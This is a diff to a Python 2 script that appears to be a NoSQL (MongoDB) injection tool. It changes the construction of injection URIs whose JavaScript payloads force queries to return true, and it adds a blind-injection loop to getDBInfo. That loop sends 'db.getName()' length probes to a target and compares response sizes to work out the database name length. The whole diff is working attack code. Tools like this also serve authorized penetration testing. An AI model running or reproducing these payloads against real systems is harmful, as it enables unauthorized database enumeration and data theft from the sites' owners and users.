@@ -795,7 +795,7 @@ def buildUri(origUri, randValue):
 	paramName = []
 	paramValue = []
 	global uriArray
-	uriArray = ["","","","","","","","","","","","","","","","",""]
+	uriArray = ["","","","","","","","","","","","","","","","","",""]
 	injOpt = ""
 	
 	#Split the string between the path and parameters, and then split each parameter
@@ -868,7 +868,7 @@ def buildUri(origUri, randValue):
 			uriArray[14] += paramName[x] + "a'; return true; var dum=a'"
 			uriArray[15] += paramName[x] + "1; return true; var dum=2"
 			#Add values that can be manipulated for database attacks
-			uriArray[16] += paramName[x] + "=a\"; if ---"
+			uriArray[16] += paramName[x] + "=a\'; ---"
 			uriArray[17] += paramName[x] + "=1; if ---"
 
 		else:
@@ -1073,9 +1073,33 @@ def brute_pass(user,key):
 	return ""
 
 def getDBInfo():
+	curLen = 0
+	nameLen = 0
+	gotNameLen = False
+	gotDbName = False
+	gotColLen = False
+	gotColName = False
 	print "Getting baseline True query return size..."
-	trueUri = uriArray[17].replace("---","a\'; return True; var dummy ='!")
+	trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
+	print "Debug " + str(trueUri)
+	baseLen = int(len(urllib.urlopen(trueUri).read()))
+	print "Got baseline true query length of " + str(baseLen)
+	
 	
 	print "Calculating DB name length..."
 	
+	while gotNameLen == False:
+		calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} vardum='a" + "&")
+		print "Debug: " + calcUri
+		lenUri = int(len(urllib.urlopen(calcUri).read()))
+		print "Debug length: " + str(lenUri)
+		
+		if lenUri == baseLen:
+			print " Got database name length of " + str(curLen) + " characters."
+			gotNameLen = True
+		
+		else:
+			curLen += 1
+	raw_input("Press enter to continue...")
+
 mainMenu()
